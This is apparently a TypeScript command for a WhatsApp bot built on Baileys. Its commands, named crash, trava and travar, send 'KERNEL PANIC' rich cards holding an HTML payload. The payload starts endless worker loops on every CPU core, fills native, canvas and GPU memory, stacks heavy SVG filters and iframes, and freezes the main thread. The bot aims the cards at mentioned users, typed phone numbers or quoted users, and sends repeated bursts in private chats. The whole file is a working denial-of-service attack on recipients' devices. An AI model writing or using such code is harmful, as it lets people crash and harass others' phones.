import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── payload ───────────────────────── */

function buildKernelPanic(name: string, lv: number) {
  const bufMb = 48 * lv;        // MB por ArrayBuffer (memoria externa)
  const bufCount = 20 * lv;     // nº de ArrayBuffers
  const canvasPx = 3600 + 2400 * lv;
  const canvasCount = 2 + lv;
  const imgCount = 70 * lv;
  const imgPx = 1200;
  const workers = 4 * lv;
  const iter = 2500 + 1500 * lv;
  const blur = 200 + 150 * lv;
  const turbOct = 6 + lv;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
#g{position:absolute;z-index:20;left:0;right:0;top:0;background:rgba(0,0,0,.86);padding:10px;border-bottom:2px solid #0ff}
h2{margin:0 0 6px;color:#0ff;text-align:center;font-size:14px;letter-spacing:2px}
.st{display:flex;justify-content:space-between;font-size:10px;color:#9ff}
.st b{color:#0ff;font-size:14px}
#s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff;white-space:pre}
canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
#tv{position:absolute;inset:0;z-index:2;opacity:.5}
#bl{position:absolute;inset:0;z-index:3;filter:blur(${blur}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 3s linear infinite}
@keyframes sp{to{transform:rotate(360deg) scale(1.4)}}
</style>
<div id="g">
  <h2>☢️ KERNEL PANIC ☢️</h2>
  <div class="st"><div>HEAP<br><b id="m">0</b></div><div>FPS<br><b id="f">0</b></div></div>
  <div id="s">fase 0</div>
</div>
<div id="bl"></div>
<svg id="tv"></svg>
<canvas id="cv"></canvas>
<script>
var cv=document.getElementById('cv'),fEl=document.getElementById('f'),mEl=document.getElementById('m'),sEl=document.getElementById('s');
var keep=[],pool=[],fr=0,lf=0,mb=0;
function fase(n){try{sEl.textContent='fase '+n}catch(e){}}
function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,10)})}catch(e){setTimeout(fn,10)}}
function mbUp(n){mb+=n;try{mEl.textContent=mb}catch(e){}}
function turb(seed,size,oct){
  return '<svg width="'+size+'" height="'+size+'" xmlns="http://www.w3.org/2000/svg">'+
   '<filter id="f'+seed+'"><feGaussianBlur stdDeviation="${blur/2}"/>'+
   '<feTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="'+oct+'" seed="'+seed+'" stitchTiles="stitch"/>'+
   '<feColorMatrix type="saturate" values="5"/></filter>'+
   '<rect width="'+size+'" height="'+size+'" filter="url(#f'+seed+')"/></svg>';
}

/* 1 · CPU: todos los núcleos, bucle infinito */
fase(1);
try{
  var src='onmessage=function(){var a=new Float64Array(4096),v=1;while(true){for(var i=0;i<4096;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
  var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
  var n=Math.max(4,(navigator.hardwareConcurrency||8)*${workers});
  for(var i=0;i<n;i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
}catch(e){}

next(function(){
  /* 2 · memoria EXTERNA al heap V8: ArrayBuffers tocados página a página */
  fase(2);
  for(var b=0;b<${bufCount};b++){
    try{
      var buf=new Uint8Array(${bufMb}*1048576);
      for(var p=0;p<buf.length;p+=4096)buf[p]=1;
      keep.push(buf);
      mbUp(${bufMb});
    }catch(e){try{sEl.textContent='heap agotado en '+mb+'MB'}catch(x){}break}
  }
  next(fase3);
});

/* 3 · backing stores de canvas (nativos, no cuentan en V8) */
function fase3(){
  fase(3);
  for(var c=0;c<${canvasCount};c++){
    try{
      var el=document.createElement('canvas');
      el.width=${canvasPx};el.height=${canvasPx};
      var g=el.getContext('2d');
      g.fillStyle='#'+((c*7)%9)+'0f';
      g.fillRect(0,0,${canvasPx},${canvasPx});
      keep.push(el);
      mbUp(Math.round(${canvasPx}*${canvasPx}*4/1048576));
    }catch(e){}
  }
  next(fase4);
}

/* 4 · bombardeo de decodificación de bitmaps */
function fase4(){
  fase(4);
  try{
    var c=document.createElement('canvas');
    c.width=${imgPx};c.height=${imgPx};
    var g=c.getContext('2d'),d=g.createImageData(${imgPx},${imgPx});
    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
    g.putImageData(d,0,0);
    var uri=c.toDataURL();
    for(var k=0;k<${imgCount};k++){
      var im=new Image();im.src=uri;keep.push(im);
      mbUp(Math.round(${imgPx}*${imgPx}*4/1048576));
    }
  }catch(e){}
  next(fase5);
}

/* 5 · SVG con desenfoque + turbulencia (rasterizado por software) */
function fase5(){
  fase(5);
  try{
    var tv=document.getElementById('tv');
    tv.setAttribute('viewBox','0 0 420 420');
    tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${blur}"/>'+
      '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${turbOct}" stitchTiles="stitch"/>'+
      '<feColorMatrix type="saturate" values="6"/></filter></defs>'+
      '<rect width="420" height="420" filter="url(#tb)"/>';
  }catch(e){}
  next(fase6);
}

/* 6 · documentos hijos, cada uno con su propia turbulencia */
function fase6(){
  fase(6);
  try{
    var seed=0;
    (function nest(l){
      if(l<=0)return;
      for(var b=0;b<2;b++){
        try{
          var f=document.createElement('iframe');
          f.style.cssText='position:absolute;width:2px;height:2px;opacity:0;left:0;top:0;border:0';
          document.body.appendChild(f);
          var doc=f.contentDocument;
          doc.open();doc.write('<body style="margin:0;background:#000">'+turb(seed++,400,${turbOct})+'</body>');doc.close();
        }catch(e){}
      }
      nest(l-1);
    })(${2 + lv});
  }catch(e){}
  next(fase7);
}

/* 7 · GPU: texturas + shader a pantalla completa */
function fase7(){
  fase(7);
  try{
    cv.width=Math.min(window.innerWidth||420,760);
    cv.height=Math.min(window.innerHeight||900,1500);
    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
    if(!gl)throw 0;
    gl.viewport(0,0,cv.width,cv.height);

    /* texturas grandes: memoria de GPU */
    for(var t=0;t<${3*lv};t++){
      try{
        var tex=gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D,tex);
        gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,1024,1024,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
        gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR);
        mbUp(4);
      }catch(e){}
    }

    var vs=gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
    gl.compileShader(vs);
    var fs=gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.3;'+
      'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
      'for(int i=0;i<${iter};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
      'if(dot(z,z)>4.)break;it++;}'+
      'float k=it/${iter}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
    gl.compileShader(fs);
    var pr=gl.createProgram();
    gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
    var bf=gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER,bf);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
    var pos=gl.getAttribLocation(pr,'p');
    gl.enableVertexAttribArray(pos);
    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
    var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
    (function loop(now){
      fr++;
      if(now-lf>=1000){try{fEl.textContent=fr}catch(e){}fr=0;lf=now}
      gl.uniform1f(uT,now*0.001);
      gl.uniform2f(uR,cv.width,cv.height);
      gl.drawArrays(gl.TRIANGLES,0,6);
      requestAnimationFrame(loop);
    })(0);
  }catch(e){}
  next(fase8);
}

/* 8 · remate: bloqueo del hilo */
function fase8(){
  fase(8);
  try{sEl.textContent+=' · '+mb+'MB'}catch(e){}
  var t0=Date.now();
  while(true){if(Date.now()-t0>900000)break}
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── comando ───────────────────────── */

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Kernel panic por agotamiento de memoria nativa del renderer: ArrayBuffers, canvas, bitmaps, texturas WebGL, feGaussianBlur y workers.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = info.mentionedJid || [];
    const quoted: string | undefined = info.participant;
    const sender: string = (msg.key as any).participant || from;

    const raw = (args[0] || "").replace(/\D/g, "");
    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;

    let targets: string[];
    let priv: boolean;

    if (mentioned.length) { targets = mentioned; priv = true; }
    else if (raw.length >= 8) { targets = [`${raw}@s.whatsapp.net`]; priv = true; }
    else if (quoted) { targets = [quoted]; priv = true; }
    else { targets = [from]; priv = false; }

    await react("☢️").catch(() => undefined);

    const card = async (jid: string, name: string, level: number) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("☢️ KERNEL PANIC // LuferOS")
        .setFooter(`nivel ${level} · ${level === 3 ? "~1.6 GB" : level === 2 ? "~700 MB" : "~250 MB"}`);
      rich.addSection(buildKernelPanic(name, level));
      return rich.send(jid);
    };

    let ok = 0;
    const fail: string[] = [];

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];

      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      /* en grupo: solo 1 rich, sin tags */
      if (!priv) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        continue;
      }

      /* en privado: ráfaga para saturar */
      const cards = 3 + lv;
      for (let i = 0; i < cards; i++) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        await sleep(300);
      }
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Kernel panic")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 tarjeta, sin tags)"}\n` +
        `Nivel ${lv} · ${ok} enviadas${fail.length ? ` · ${fail.length} fallos` : ""}`,
    ).catch(() => undefined);
  },
};
